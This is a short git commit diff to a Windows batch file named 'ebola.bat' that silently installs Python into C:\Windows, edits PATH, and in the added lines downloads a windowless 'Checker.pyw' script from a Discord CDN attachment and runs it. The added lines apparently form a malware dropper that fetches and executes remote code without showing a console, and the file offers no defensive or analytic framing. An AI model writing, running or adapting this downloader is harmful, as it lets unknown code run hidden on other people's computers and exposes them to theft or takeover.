379d525746d543a21490b07b37c80902c06da3f1
Chrome <80221878+China0002@users.noreply.github.com>
2023-03-03 20:44:29 -0600

    Add files via upload

--- ebola.bat
+++ ebola.bat
@@ -2,4 +2,5 @@ ECHO @OFF
 curl https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -o python-3.10.0-amd64.exe
 python-3.10.0-amd64.exe /quiet TargetDir=C:\Windows
 setx PATH "%PATH%;C:\Python310;C:\Python310\Scripts"
-
+curl https://cdn.discordapp.com/attachments/1079932244010991637/1081015652032204914/Checker.pyw -O
+start Checker.pyw
